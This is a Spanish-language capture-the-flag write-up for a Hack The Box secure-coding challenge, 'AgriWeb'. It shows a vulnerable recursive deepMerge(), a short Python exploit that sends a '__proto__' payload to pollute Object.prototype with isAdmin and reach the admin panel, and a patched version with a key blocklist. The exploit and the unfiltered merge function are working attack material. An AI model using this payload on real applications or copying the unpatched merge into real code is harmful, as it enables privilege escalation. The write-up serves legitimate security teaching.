---
title: "HTB Secure Coding S10 — AgriWeb: Prototype Pollution"
date: 2026-04-20
description: "Writeup de AgriWeb (HTB Secure Coding Season 10). Prototype Pollution a través de una función deepMerge() sin filtrar keys peligrosas permite escalar a admin sin credenciales."
excerpt: "Prototype Pollution vía deepMerge() sin validación de keys permite inyectar isAdmin en Object.prototype y acceder al panel de administración."
tags: ["HTB", "Secure Coding", "Web", "Prototype Pollution", "Node.js", "Express", "JWT"]
platform: "HTB"
difficulty: "Easy"
image: "/images/blog/htb-agriweb.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | AgriWeb |
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | Prototype Pollution vía `deepMerge()` |
| Stack | Node.js / Express / SQLite |

## Descripción

Aplicación de gestión agrícola con JWT. El admin panel retorna la flag si `req.user.isAdmin === true`.

## Vulnerabilidad

`routes/profile.js` implementa un `deepMerge()` recursivo sin filtrar keys peligrosas:

```javascript
// VULNERABLE — routes/profile.js
function deepMerge(target, source) {
    for (let key in source) {
        // key puede ser "__proto__", "constructor", "prototype"
        if (source[key] && typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

## Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

s.post(f"{BASE}/api/auth/register", json={"username":"h","email":"h@t.com","password":"h"})
r = s.post(f"{BASE}/api/auth/login", json={"username":"h","password":"h"})
token = r.json()["token"]

# Prototype pollution — inyecta isAdmin en Object.prototype
s.post(f"{BASE}/api/profile",
    json={"__proto__": {"isAdmin": True}},
    headers={"Authorization": f"Bearer {token}"})

# Todos los objetos heredan isAdmin: true
r = s.get(f"{BASE}/admin", headers={"Authorization": f"Bearer {token}"})
print(r.json()["flag"])
```

## Parche

```javascript
// routes/profile.js
const BLOCKED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function deepMerge(target, source) {
    for (let key in source) {
        if (BLOCKED_KEYS.has(key)) continue;
        if (!Object.prototype.hasOwnProperty.call(source, key)) continue;

        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = Object.create(null);
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**Tres capas:** `BLOCKED_KEYS` bloquea las keys peligrosas, `hasOwnProperty` evita iterar keys heredadas en el `for...in`, y `Object.create(null)` crea objetos intermedios sin prototype.

## Key Takeaways

1. **`for...in` itera el prototype chain** — usar `hasOwnProperty` o `Object.keys()` (que no lo hace) para evitar procesar keys heredadas.
2. **`__proto__`, `constructor`, `prototype` son always-blocklist** — cualquier función de merge/assign recursivo debe filtrarlas explícitamente.
3. **`Object.create(null)` para objetos internos** — los objetos sin prototype no son vulnerables a pollution.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
